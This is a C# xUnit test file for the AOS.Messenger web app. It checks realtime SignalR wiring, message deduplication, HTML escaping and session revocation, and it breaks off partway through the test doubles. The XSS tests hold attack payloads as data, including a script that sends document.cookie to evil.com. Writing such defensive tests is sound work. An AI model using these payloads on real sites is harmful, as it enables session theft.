using System.Diagnostics;
using System.Reflection;
using System.Security.Claims;
using System.Text.RegularExpressions;
using AOS.Messenger.Application.Common;
using AOS.Messenger.Application.Common.Interfaces;
using AOS.Messenger.Application.DTOs;
using AOS.Messenger.Domain.ValueObjects;
using AOS.Messenger.Infrastructure.Identity;
using AOS.Messenger.Infrastructure.Persistence;
using AOS.Messenger.Web.Controllers;
using AOS.Messenger.Web.Hubs;
using AOS.Messenger.Web.Services;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Http.Features;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;

namespace AOS.Messenger.Tests;

/// <summary>
/// Rigorous, independent QA verification tests for Phase 6 Client-Side Realtime & State Reconciliation deliverables:
/// 1. Deliverable Asset Existence & Wiring (chat-realtime.js, signalr.min.js, Conversation.cshtml script references, reconnect banner)
/// 2. Reconciliation & Deduplication Invariant (DOM deduplication by ID, state reconciliation keyset query on reconnect, chronological order)
/// 3. XSS & Content Sanitization (live incoming SignalR payloads containing script tags, HTML entities, or special characters safely escaped)
/// 4. Session Invalidation (account logout or session revocation terminates SignalR access, [Authorize] hub guard, unauthenticated rejection)
/// 5. Repository Directives Invariant (zero #region directives anywhere)
/// </summary>
public sealed class RealtimeClientVerificationTests : IClassFixture<SqlTestDatabaseFixture>
{
    private readonly SqlTestDatabaseFixture _fixture;

    public RealtimeClientVerificationTests(SqlTestDatabaseFixture fixture)
    {
        _fixture = fixture;
    }
    private static string FindSolutionRoot()
    {
        var current = new DirectoryInfo(AppContext.BaseDirectory);
        while (current != null &&
               !File.Exists(Path.Combine(current.FullName, "AOS.Messenger.sln")) &&
               !File.Exists(Path.Combine(current.FullName, "AOS.Messenger.slnx")) &&
               !Directory.Exists(Path.Combine(current.FullName, "src", "AOS.Messenger.Web")))
        {
            current = current.Parent;
        }

        if (current == null)
        {
            throw new DirectoryNotFoundException("Could not locate solution root containing AOS.Messenger.slnx or src/AOS.Messenger.Web.");
        }

        return current.FullName;
    }

    private static string JsUrl(string fileName)
    {
        var path = Path.Combine(FindSolutionRoot(), "src", "AOS.Messenger.Web", "wwwroot", "js", fileName);
        return new Uri(path).AbsoluteUri;
    }

    private static (int ExitCode, string Output, string Error) RunNodeScript(string script)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "node",
            Arguments = "--input-type=module -",
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using var process = Process.Start(psi);
        if (process == null)
        {
            throw new InvalidOperationException("Failed to start node process for JavaScript verification.");
        }

        process.StandardInput.Write(script);
        process.StandardInput.Close();

        var output = process.StandardOutput.ReadToEnd();
        var error = process.StandardError.ReadToEnd();
        process.WaitForExit(10000);

        return (process.ExitCode, output, error);
    }

    // =========================================================================
    // 1. Deliverable Asset Existence & Wiring Tests
    // =========================================================================

    [Fact]
    public void RealtimeAssets_ExistAndAreNonEmpty()
    {
        var slnRoot = FindSolutionRoot();
        var signalrClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
        var chatShellPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-shell.js");
        var messageRendererPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "message-renderer.js");
        var sidebarPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "sidebar.js");
        var legacyChatRealtimePath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-realtime.js");
        var signalrMinPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "lib", "signalr", "signalr.min.js");
        var conversationViewPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "Views", "Chat", "Conversation.cshtml");

        Assert.True(File.Exists(signalrClientPath), $"signalr-client.js not found at: {signalrClientPath}");
        Assert.True(File.Exists(chatShellPath), $"chat-shell.js not found at: {chatShellPath}");
        Assert.True(File.Exists(messageRendererPath), $"message-renderer.js not found at: {messageRendererPath}");
        Assert.True(File.Exists(sidebarPath), $"sidebar.js not found at: {sidebarPath}");
        Assert.False(File.Exists(legacyChatRealtimePath), "Legacy chat-realtime.js must remain retired.");
        Assert.True(File.Exists(signalrMinPath), $"signalr.min.js not found at: {signalrMinPath}");
        Assert.True(File.Exists(conversationViewPath), $"Conversation.cshtml not found at: {conversationViewPath}");

        Assert.True(File.ReadAllText(signalrClientPath).Length > 500, "signalr-client.js should contain substantial implementation.");
        Assert.True(File.ReadAllText(chatShellPath).Length > 500, "chat-shell.js should contain substantial implementation.");
        Assert.True(File.ReadAllText(messageRendererPath).Length > 500, "message-renderer.js should contain substantial implementation.");
        Assert.True(File.ReadAllText(sidebarPath).Length > 500, "sidebar.js should contain substantial implementation.");
        Assert.True(File.ReadAllText(signalrMinPath).Length > 10000, "signalr.min.js should contain the minified SignalR client library.");
        Assert.True(File.ReadAllText(conversationViewPath).Length > 500, "Conversation.cshtml should contain view markup and scripts.");
    }

    [Fact]
    public void SignalRMinJs_IsNonEmpty_AndContainsSignalRCoreLibrary()
    {
        var slnRoot = FindSolutionRoot();
        var signalrMinPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "lib", "signalr", "signalr.min.js");
        var content = File.ReadAllText(signalrMinPath);

        Assert.Contains("HubConnectionBuilder", content);
        Assert.Contains("signalR", content);
    }

    [Fact]
    public void ConversationCshtml_ProperlyReferencesSignalRAndChatRealtime()
    {
        var slnRoot = FindSolutionRoot();
        var conversationViewPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "Views", "Chat", "Conversation.cshtml");
        var content = File.ReadAllText(conversationViewPath);

        // Unified Chat Shell loads signalr.min.js + chat-shell.js once (never duplicate chat-realtime.js)
        Assert.Contains("<script src=\"~/lib/signalr/signalr.min.js\" asp-append-version=\"true\"></script>", content);
        Assert.Contains("<script type=\"module\" src=\"~/js/chat-actions.js\" asp-append-version=\"true\"></script>", content);
        Assert.Contains("<script type=\"module\" src=\"~/js/chat-shell.js\" asp-append-version=\"true\"></script>", content);
        Assert.DoesNotContain("chat-realtime.js", content);
    }

    [Fact]
    public void ConversationCshtml_ContainsConnectionBanner_ForReconnectStatus()
    {
        var slnRoot = FindSolutionRoot();
        var conversationViewPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "Views", "Chat", "Conversation.cshtml");
        var content = File.ReadAllText(conversationViewPath);

        // Assert reconnecting / offline banner elements exist
        Assert.Contains("id=\"connection-banner\"", content);
        Assert.Contains("id=\"connection-banner-text\"", content);
        Assert.Contains("Reconnecting to chat...", content);
        Assert.Contains("Syncing live messages", content);
    }

    [Fact]
    public void ConversationCshtml_InitializesChatRealtimeWithRequiredParameters()
    {
        var slnRoot = FindSolutionRoot();
        var conversationViewPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "Views", "Chat", "Conversation.cshtml");
        var chatShellPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "chat-shell.js");
        var signalrClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");

        var content = File.ReadAllText(conversationViewPath);
        var shellContent = File.ReadAllText(chatShellPath);
        var clientContent = File.ReadAllText(signalrClientPath);

        Assert.Contains("id=\"chat-bootstrap\"", content);
        Assert.Contains("initialConversationId", content);
        Assert.Contains("currentUserId", content);
        Assert.Contains("nextCursor", content);
        Assert.Contains("createSignalRClient", shellContent);
        Assert.Contains("JoinConversation", clientContent);
    }

    // =========================================================================
    // 2. Reconciliation & Deduplication Invariant Tests
    // =========================================================================

    [Fact]
    public void ChatRealtimeJs_GetMessageId_HandlesMultipleIdRepresentations()
    {
        var rendererUrl = JsUrl("message-renderer.js");

        var testScript = $@"
            import {{ getMessageId }} from '{rendererUrl}';

            // 1. String ID
            if (getMessageId('msg-123') !== 'msg-123') process.exit(1);

            // 2. Object with string id
            if (getMessageId({{ id: 'msg-456' }}) !== 'msg-456') process.exit(2);

            // 3. Strongly-typed object with id.value (from C# MessageId serialization)
            if (getMessageId({{ id: {{ value: 'msg-789' }} }}) !== 'msg-789') process.exit(3);

            // 4. Object with messageId property
            if (getMessageId({{ messageId: 'msg-abc' }}) !== 'msg-abc') process.exit(4);

            // 5. Null or undefined
            if (getMessageId(null) !== null || getMessageId(undefined) !== null) process.exit(5);

            console.log('SUCCESS');
        ";

        var (exitCode, output, error) = RunNodeScript(testScript);
        Assert.True(exitCode == 0, $"Node script failed with exitCode {exitCode}. Output: {output}. Error: {error}");
        Assert.Contains("SUCCESS", output);
    }

    [Fact]
    public void ChatRealtimeJs_IsMessageRendered_ChecksElementIdAndDataAttribute()
    {
        var rendererUrl = JsUrl("message-renderer.js");

        var testScript = $@"
            import {{ isMessageRendered }} from '{rendererUrl}';

            const mockDom = {{
                'msg-alpha': {{ id: 'msg-alpha' }}
            }};

            globalThis.document = {{
                getElementById: (id) => mockDom[id] || null,
                querySelector: (selector) => {{
                    if (selector === '[data-message-id=""beta""]') return {{ dataset: {{ messageId: 'beta' }} }};
                    return null;
                }}
            }};

            // Should find by id='msg-alpha'
            if (!isMessageRendered('alpha')) process.exit(1);

            // Should find by data-message-id='beta'
            if (!isMessageRendered('beta')) process.exit(2);

            // Should return false for unrendered message
            if (isMessageRendered('gamma')) process.exit(3);

            console.log('SUCCESS');
        ";

        var (exitCode, output, error) = RunNodeScript(testScript);
        Assert.True(exitCode == 0, $"Node script failed with exitCode {exitCode}. Output: {output}. Error: {error}");
        Assert.Contains("SUCCESS", output);
    }

    [Fact]
    public void ChatRealtimeJs_ReceiveMessage_DeduplicatesAgainstExistingDomElements()
    {
        var slnRoot = FindSolutionRoot();
        var signalrClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
        var rendererPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "message-renderer.js");
        var content = File.ReadAllText(signalrClientPath) + "\n" + File.ReadAllText(rendererPath);

        // Assert that ReceiveMessage handler delegates to insertMessageOrdered which deduplicates against existing DOM elements
        Assert.Contains("connection.on('ReceiveMessage'", content);
        Assert.Contains("insertMessageOrdered", content);
        Assert.Contains("document.getElementById(`msg-${msgId}`)", content);
        Assert.Contains("if (!msgId || isMessageRendered(msgId)) continue;", content);
    }

    [Fact]
    public void ChatRealtimeJs_InsertMissingMessages_SkipsAlreadyRenderedMessages()
    {
        var slnRoot = FindSolutionRoot();
        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
        var content = File.ReadAllText(jsPath);

        // Assert that reconcileActiveConversation checks isMessageRendered before inserting
        Assert.Contains("async function reconcileActiveConversation", content);
        Assert.Contains("if (!msgId || isMessageRendered(msgId)) continue;", content);
    }

    [Fact]
    public void ChatRealtimeJs_ReconcileState_QueriesAuthoritativeRestEndpoint_WithLatestCursor()
    {
        var slnRoot = FindSolutionRoot();
        var signalrClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
        var apiClientPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "api-client.js");
        var content = File.ReadAllText(signalrClientPath) + "\n" + File.ReadAllText(apiClientPath);

        // Assert keyset state reconciliation query (RT-005: queries latest page without inverted cursor)
        Assert.Contains("async function reconcileActiveConversation", content);
        Assert.Contains("getConversationBundle(convId, { pageSize: DEFAULT_MESSAGE_PAGE_SIZE })", content);
        Assert.Contains("export const DEFAULT_MESSAGE_PAGE_SIZE = 20;", content);

        // Assert caller accepts JSON
        Assert.Contains("'Accept': 'application/json'", content);

        // Assert insertion of missing messages
        Assert.Contains("insertMessageOrdered(containerEl, msg, state.currentUserId, state.activeMeta)", content);
    }

    [Fact]
    public void ChatRealtimeJs_AutomaticReconnect_ConfiguresExponentialBackoffIntervals()
    {
        var slnRoot = FindSolutionRoot();
        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
        var content = File.ReadAllText(jsPath);

        // Verify automatic reconnect configuration with 0, 2s, 5s, 10s, 30s backoff delays
        Assert.Contains(".withAutomaticReconnect([0, 2000, 5000, 10000, 30000])", content);
    }

    [Fact]
    public void ChatRealtimeJs_OnReconnected_InvokesJoinConversationAndReconcileState()
    {
        var slnRoot = FindSolutionRoot();
        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
        var content = File.ReadAllText(jsPath);

        // Verify onreconnected re-joins conversation room and initiates state reconciliation
        Assert.Contains("connection.onreconnected(async () =>", content);
        Assert.Contains("await connection.invoke('JoinConversation', target);", content);
        Assert.Contains("await reconcileActiveConversation(activeId, epoch);", content);
    }

    [Fact]
    public void ChatRealtime_SimulatedClientDeduplication_NeverProducesDuplicateMessages_UnderConcurrentRestAndSignalR()
    {
        var rendererUrl = JsUrl("message-renderer.js");

        var testScript = $@"
            import {{ getMessageId, isMessageRendered, createMessageBubbleHtml }} from '{rendererUrl}';

            const domElements = new Map();

            globalThis.document = {{
                getElementById: (id) => domElements.get(id) || null,
                querySelector: (sel) => null
            }};

            const container = {{
                insertAdjacentHTML: (pos, html) => {{
                    const match = html.match(/id=""(msg-[^""]+)""/);
                    if (match) {{
                        const id = match[1];
                        if (domElements.has(id)) {{
                            throw new Error('DUPLICATE_DOM_ELEMENT_DETECTED: ' + id);
                        }}
                        domElements.set(id, {{ id, html }});
                    }}
                }}
            }};

            // Mock options
            const currentUserId = 'user-current-111';

            // 1. Initial REST messages (IDs: msg-1, msg-2, msg-3)
            const initialMessages = [
                {{ id: 'msg-1', content: 'First message', senderId: 'user-2', createdAtUtc: '2026-11-19T20:00:00Z' }},
                {{ id: 'msg-2', content: 'Second message', senderId: 'user-current-111', createdAtUtc: '2026-11-19T20:01:00Z' }},
                {{ id: 'msg-3', content: 'Third message', senderId: 'user-2', createdAtUtc: '2026-11-19T20:02:00Z' }}
            ];

            for (const msg of initialMessages) {{
                const id = getMessageId(msg);
                if (!isMessageRendered(id)) {{
                    const html = createMessageBubbleHtml(msg, currentUserId);
                    container.insertAdjacentHTML('beforeend', html);
                }}
            }}

            if (domElements.size !== 3) {{
                process.exit(1);
            }}

            // 2. Incoming SignalR broadcast for msg-3 (DUPLICATE arriving via realtime)
            const dupSignalRMessage = {{ id: 'msg-3', content: 'Third message', senderId: 'user-2', createdAtUtc: '2026-11-19T20:02:00Z' }};
            const dupId = getMessageId(dupSignalRMessage);
            if (!isMessageRendered(dupId)) {{
                const html = createMessageBubbleHtml(dupSignalRMessage, currentUserId);
                container.insertAdjacentHTML('beforeend', html);
            }}

            // Count must still be 3 (not 4)
            if (domElements.size !== 3) {{
                process.exit(2);
            }}

            // 3. Incoming SignalR broadcast for msg-4 (NEW message)
            const newSignalRMessage = {{ id: 'msg-4', content: 'Fourth message', senderId: 'user-2', createdAtUtc: '2026-11-19T20:03:00Z' }};
            const newId = getMessageId(newSignalRMessage);
            if (!isMessageRendered(newId)) {{
                const html = createMessageBubbleHtml(newSignalRMessage, currentUserId);
                container.insertAdjacentHTML('beforeend', html);
            }}

            // Count should now be 4
            if (domElements.size !== 4) {{
                process.exit(3);
            }}

            // 4. Reconnect occurs: state reconciliation fetches messages (msg-2, msg-3, msg-4)
            const reconciledMessages = [
                {{ id: 'msg-2', content: 'Second message', senderId: 'user-current-111', createdAtUtc: '2026-11-19T20:01:00Z' }},
                {{ id: 'msg-3', content: 'Third message', senderId: 'user-2', createdAtUtc: '2026-11-19T20:02:00Z' }},
                {{ id: 'msg-4', content: 'Fourth message', senderId: 'user-2', createdAtUtc: '2026-11-19T20:03:00Z' }}
            ];

            for (const msg of reconciledMessages) {{
                const rId = getMessageId(msg);
                if (!isMessageRendered(rId)) {{
                    const html = createMessageBubbleHtml(msg, currentUserId);
                    container.insertAdjacentHTML('beforeend', html);
                }}
            }}

            // Count must REMAIN strictly 4, zero duplicates
            if (domElements.size !== 4) {{
                process.exit(4);
            }}

            console.log('SUCCESS_DEDUPLICATION_VERIFIED');
        ";

        var (exitCode, output, error) = RunNodeScript(testScript);
        Assert.True(exitCode == 0, $"Node script failed with exitCode {exitCode}. Output: {output}. Error: {error}");
        Assert.Contains("SUCCESS_DEDUPLICATION_VERIFIED", output);
    }

    // =========================================================================
    // 3. XSS & Content Sanitization Tests
    // =========================================================================

    [Theory]
    [InlineData("<script>alert('xss')</script>", "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;")]
    [InlineData("\" onerror=\"alert(1)\"", "&quot; onerror=&quot;alert(1)&quot;")]
    [InlineData("<b>Hello</b> & 'world'", "&lt;b&gt;Hello&lt;/b&gt; &amp; &#39;world&#39;")]
    [InlineData("<img src=x onerror=alert(document.cookie)>", "&lt;img src=x onerror=alert(document.cookie)&gt;")]
    [InlineData("Foo & Bar < Baz > \"Qux\" 'Corge'", "Foo &amp; Bar &lt; Baz &gt; &quot;Qux&quot; &#39;Corge&#39;")]
    public void ChatRealtimeJs_EscapeHtml_SanitizesSpecialCharacters(string rawInput, string expectedEscaped)
    {
        var rendererUrl = JsUrl("message-renderer.js");

        var testScript = $@"
            import {{ escapeHtml }} from '{rendererUrl}';

            const result = escapeHtml({System.Text.Json.JsonSerializer.Serialize(rawInput)});
            console.log(result);
        ";

        var (exitCode, output, error) = RunNodeScript(testScript);
        Assert.True(exitCode == 0, $"Node script failed with exitCode {exitCode}. Output: {output}. Error: {error}");
        Assert.Equal(expectedEscaped, output.TrimEnd('\r', '\n'));
    }

    [Fact]
    public void ChatRealtimeJs_CreateMessageBubbleHtml_EscapesAllUserControlledFields()
    {
        var slnRoot = FindSolutionRoot();
        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "message-renderer.js");
        var content = File.ReadAllText(jsPath);

        // Verify escapeHtml is applied to all user-controlled text
        Assert.Contains("escapeHtml(message.content)", content);
        Assert.Contains("escapeHtml(message.senderName", content);
        Assert.Contains("escapeHtml(getInitials(message.senderName, message.senderHandle))", content);
        Assert.Contains("escapeHtml(message.replyTo.previewContent", content);

        // Assert no unencoded message.content is interpolated
        var rawInterpolationMatches = Regex.Matches(content, @"\$\{message\.content\}");
        Assert.Empty(rawInterpolationMatches);
    }

    [Fact]
    public void ChatRealtimeJs_CreateMessageBubbleHtml_DeletedForEveryone_MasksContent()
    {
        var rendererUrl = JsUrl("message-renderer.js");

        var testScript = $@"
            import {{ createMessageBubbleHtml }} from '{rendererUrl}';

            const deletedMessage = {{
                id: 'msg-del-1',
                senderId: 'user-1',
                senderName: 'Attacker',
                content: '<script>alert(""should not appear"")</script>',
                isDeletedForEveryone: true,
                createdAtUtc: '2026-11-19T20:00:00Z'
            }};

            const html = createMessageBubbleHtml(deletedMessage, 'user-2');

            // Must contain deleted placeholder
            if (!html.includes('This message was deleted')) process.exit(1);

            // Must NOT contain the original content
            if (html.includes('should not appear')) process.exit(2);

            console.log('SUCCESS_DELETED_MASKED');
        ";

        var (exitCode, output, error) = RunNodeScript(testScript);
        Assert.True(exitCode == 0, $"Node script failed with exitCode {exitCode}. Output: {output}. Error: {error}");
        Assert.Contains("SUCCESS_DELETED_MASKED", output);
    }

    [Fact]
    public void ChatRealtime_NodeExecution_VerifiesAdversarialXssPayloadsAreInert()
    {
        var rendererUrl = JsUrl("message-renderer.js");

        var testScript = $@"
            import {{ createMessageBubbleHtml }} from '{rendererUrl}';

            const payloads = [
                '<script>fetch(""http://evil.com/steal?cookie="" + document.cookie)</script>',
                '<img src=x onerror=alert(document.domain)>',
                '"" onfocus=""alert(1)"" autofocus=""',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<iframe src=""javascript:alert(1)""></iframe>'
            ];

            for (const payload of payloads) {{
                const msg = {{
                    id: 'msg-xss-' + Math.random(),
                    senderId: 'attacker-1',
                    senderName: '<b>Evil User</b>',
                    senderHandle: 'evil""user',
                    content: payload,
                    createdAtUtc: '2026-11-19T20:00:00Z',
                    replyTo: {{
                        senderName: '<script>alert(2)</script>',
                        previewContent: '"" onmouseover=""alert(3)'
                    }}
                }};

                const html = createMessageBubbleHtml(msg, 'victim-user');

                // Assert zero raw dangerous opening tags
                if (html.includes('<script>') || html.includes('<script ') || html.includes('</script>')) {{
                    throw new Error('Unescaped script tag in bubble: ' + html);
                }}

                if (html.includes('<iframe') || html.includes('<img ') || html.includes('<svg') || html.includes('<body') || html.includes('<input')) {{
                    throw new Error('Unescaped raw HTML tag in bubble: ' + html);
                }}

                // Assert no attribute breakout occurred via injected quotes
                if (html.includes('\x22 onerror=') || html.includes('\x22 onload=') || html.includes('\x22 onfocus=') || html.includes('\x22 onmouseover=')) {{
                    throw new Error('Attribute breakout detected in bubble: ' + html);
                }}
            }}

            console.log('SUCCESS_XSS_DEFENSE_VERIFIED');
        ";

        var (exitCode, output, error) = RunNodeScript(testScript);
        Assert.True(exitCode == 0, $"Node script failed with exitCode {exitCode}. Output: {output}. Error: {error}");
        Assert.Contains("SUCCESS_XSS_DEFENSE_VERIFIED", output);
    }

    // =========================================================================
    // 4. Session Invalidation Tests
    // =========================================================================

    [Fact]
    public void ChatHub_IsDecoratedWithAuthorizeAttribute()
    {
        var hubType = typeof(ChatHub);
        var authAttr = hubType.GetCustomAttribute<AuthorizeAttribute>(inherit: true);

        Assert.NotNull(authAttr);
    }

    [Fact]
    public async Task ChatHub_JoinConversation_RejectsUnauthenticatedCaller_WithHubException()
    {
        var tracker = new InMemoryConnectionTracker();
        var unauthenticatedUser = new FakeCurrentUser { Id = null };
        var convService = new FakeConversationService();
        var hub = new ChatHub(convService, tracker, unauthenticatedUser, NullLogger<ChatHub>.Instance);

        hub.Context = new TestHubCallerContext("conn-anon-1");
        hub.Groups = new TestGroupManager();

        var ex = await Assert.ThrowsAsync<HubException>(() => hub.JoinConversation(Guid.NewGuid()));
        Assert.Contains("User is not authenticated", ex.Message);
    }

    [Fact]
    public async Task AccountController_Logout_RevokesSession_AndSignsOutUser()
    {
        var identityService = new FakeIdentityService();
        var sessionService = new FakeSessionService();
        var currentUser = new FakeCurrentUser { Id = UserId.New() };
        var emailSender = new FakeEmailSender();

        var controller = new AccountController(identityService, sessionService, currentUser, emailSender);
        controller.ControllerContext = new ControllerContext
        {
            HttpContext = new DefaultHttpContext()
        };

        var result = await controller.Logout();

        Assert.True(identityService.LogoutCalled, "AccountController.Logout must invoke IIdentityService.LogoutAsync.");
        var redirectResult = Assert.IsType<RedirectToActionResult>(result);
        Assert.Equal("Login", redirectResult.ActionName);
        Assert.Equal("Account", redirectResult.ControllerName);
    }

    [Fact]
    public async Task SessionService_RevokeSession_MarksSessionAsRevoked_AndIsSessionActiveReturnsFalse()
    {
        await using var db = _fixture.CreateDbContext();
        var sessionService = new SessionService(db);

        var userId = UserId.New();
        var sessionId = await sessionService.CreateSessionAsync(
            userId, "Test Browser", "127.0.0.1", "Mozilla/5.0", CancellationToken.None);

        // Before revocation: session is active
        var isActiveBefore = await sessionService.IsSessionActiveAsync(sessionId, CancellationToken.None);
        Assert.True(isActiveBefore);

        // Revoke session (as triggered during logout or security revocation)
        var revoked = await sessionService.RevokeSessionAsync(userId, sessionId, CancellationToken.None);
        Assert.True(revoked);

        // After revocation: session is NO LONGER active
        var isActiveAfter = await sessionService.IsSessionActiveAsync(sessionId, CancellationToken.None);
        Assert.False(isActiveAfter);
    }

    [Fact]
    public void ChatRealtimeJs_RegistersPageLifecycleHandlers_ToLeaveConversationOnUnload()
    {
        var slnRoot = FindSolutionRoot();
        var jsPath = Path.Combine(slnRoot, "src", "AOS.Messenger.Web", "wwwroot", "js", "signalr-client.js");
        var content = File.ReadAllText(jsPath);

        // Verify lifecycle cleanup listeners are registered
        Assert.Contains("window.addEventListener('beforeunload', handlePageLeave);", content);
        Assert.Contains("window.addEventListener('pagehide', handlePageLeave);", content);
        Assert.Contains("connection.invoke('LeaveConversation', current)", content);
    }

    // =========================================================================
    // 5. Repository Directives Invariant (Zero #region anywhere)
    // =========================================================================

    [Fact]
    public void RealtimeClientVerificationTests_ContainsZeroRegionDirectives()
    {
        var slnRoot = FindSolutionRoot();
        var thisFilePath = Path.Combine(slnRoot, "tests", "AOS.Messenger.Tests", "RealtimeClientVerificationTests.cs");

        Assert.True(File.Exists(thisFilePath));
        var lines = File.ReadAllLines(thisFilePath);

        var regionLines = lines
            .Select((line, index) => (line, index: index + 1))
            .Where(x => x.line.TrimStart().StartsWith("#region", StringComparison.OrdinalIgnoreCase) ||
                        x.line.TrimStart().StartsWith("#endregion", StringComparison.OrdinalIgnoreCase))
            .ToList();

        Assert.Empty(regionLines);
    }

    [Fact]
    public void EntireRepository_ContainsZeroRegionDirectives_InAnyCSharpFile()
    {
        var slnRoot = FindSolutionRoot();

        var csharpFiles = Directory.GetFiles(slnRoot, "*.cs", SearchOption.AllDirectories)
            .Where(f => !f.Contains(Path.DirectorySeparatorChar + "obj" + Path.DirectorySeparatorChar) &&
                        !f.Contains(Path.DirectorySeparatorChar + "bin" + Path.DirectorySeparatorChar))
            .ToList();

        Assert.NotEmpty(csharpFiles);

        var filesWithRegions = new List<string>();

        foreach (var file in csharpFiles)
        {
            var lines = File.ReadAllLines(file);
            if (lines.Any(l => l.TrimStart().StartsWith("#region", StringComparison.OrdinalIgnoreCase) ||
                               l.TrimStart().StartsWith("#endregion", StringComparison.OrdinalIgnoreCase)))
            {
                filesWithRegions.Add(Path.GetRelativePath(slnRoot, file));
            }
        }

        Assert.True(
            filesWithRegions.Count == 0,
            $"Found forbidden #region directives in: {string.Join(", ", filesWithRegions)}");
    }

    // =========================================================================
    // Test Doubles & Helpers
    // =========================================================================

    private sealed class FakeCurrentUser : ICurrentUser
    {
        public UserId? Id { get; set; }
        public bool IsAuthenticated => Id != null;
    }

    private sealed class FakeConversationService : IConversationService
    {
        public Task<ConversationDetailDto> GetOrCreateConversationAsync(UserId currentUserId, UserId targetUserId, CancellationToken ct = default)
            => throw new NotImplementedException();

        public Task<ConversationDetailDto> GetConversationAsync(UserId currentUserId, ConversationId conversationId, CancellationToken ct = default)
            => Task.FromResult(new ConversationDetailDto(
                conversationId,
                UserId.New(),
                "Other User",
                "other_user",
                null,
                false,
                false,
                false,
                false,
                DateTimeOffset.UtcNow));

        public Task<IReadOnlyList<ConversationSummaryDto>> GetConversationListAsync(UserId currentUserId, bool includeArchived = false, CancellationToken ct = default)
            => Task.FromResult<IReadOnlyList<ConversationSummaryDto>>([]);

        public Task<bool> PinConversationAsync(UserId currentUserId, ConversationId conversationId, bool isPinned, CancellationToken ct = default)
            => Task.FromResult(true);

        public Task<bool> ArchiveConversationAsync(UserId currentUserId, ConversationId conversationId, bool isArchived, CancellationToken ct = default)
            => Task.FromResult(true);

        public Task<bool> MuteConversationAsync(UserId currentUserId, ConversationId conversationId, bool isMuted, CancellationToken ct = default)
            => Task.FromResult(true);

        public Task<bool> ClearChatAsync(UserId currentUserId, ConversationId conversationId, CancellationToken ct = default)
            => Task.FromResult(true);

        public Task<bool> DeleteConversationAsync(UserId currentUserId, ConversationId conversationId, CancellationToken ct = default)
            => Task.FromResult(true);
    }

    private sealed class FakeIdentityService : IIdentityService
    {
        public bool LogoutCalled { get; private set; }

        public Task<(bool Succeeded, UserId? UserId, IEnumerable<string> Errors)> RegisterAsync(RegisterUserDto dto, CancellationToken ct = default)
            => throw new NotImplementedException();

        public Task<(bool Succeeded, bool RequiresTwoFactor, bool IsLockedOut, bool IsDeleted, string? Error)> LoginAsync(LoginUserDto dto, string? ipAddress, string? userAgent, CancellationToken ct = default)
            => throw new NotImplementedException();

        public Task LogoutAsync(CancellationToken ct = default)
        {
            LogoutCalled = true;
            return Task.CompletedTask;
        }

        public Task<bool> SoftDeleteAccountAsync(UserId userId, CancellationToken ct = default) => throw new NotImplementedException();
        public Task<InitiateAccountRecoveryResult?> InitiateAccountRecoveryAsync(string usernameOrEmail, string password, CancellationToken ct = default) => throw new NotImplementedException();
        public Task<bool> ConfirmAccountRecoveryAsync(UserId userId, string token, CancellationToken ct = default) => throw new NotImplementedException();
        public Task<bool> RecoverAccountAsync(string usernameOrEmail, string password, CancellationToken ct = default) => throw new NotImplementedException();
        public Task<bool> ConfirmEmailAsync(UserId userId, string token, CancellationToken ct = default) => throw new NotImplementedException();
        public Task<string?> GenerateEmailConfirmationTokenAsync(UserId userId, CancellationToken ct = default) => throw new NotImplementedException();
        public Task<string?> GeneratePasswordResetTokenAsync(string email, CancellationToken ct = default) => throw new NotImplementedException();
        public Task<(bool Succeeded, IEnumerable<string> Errors)> ResetPasswordAsync(ResetPasswordDto dto, CancellationToken ct = default) => throw new NotImplementedException();
        public Task<(bool Succeeded, IEnumerable<string> Errors)> ChangePasswordAsync(UserId userId, string currentPassword, string newPassword, CancellationToken ct = default) => throw new NotImplementedException();
    }

    private sealed class FakeSessionService : ISessionService
    {
        public Task<IReadOnlyList<UserSessionDto>> GetActiveSessionsAsync(UserId userId, Guid? currentSessionId = null, CancellationToken ct = default)
            => Task.FromResult<IReadOnlyList<UserSessionDto>>([]);

        public Task<Guid> CreateSessionAsync(UserId userId, string deviceName, string? ipAddress, string? userAgent, CancellationToken ct = default)
            => Task.FromResult(Guid.NewGuid());

        public Task<bool> RevokeSessionAsync(UserId userId, Guid sessionId, CancellationToken ct = default)
            => Task.FromResult(true);

        public Task RevokeOtherSessionsAsync(UserId userId, Guid currentSessionId, CancellationToken ct = default)
            => Task.CompletedTask;

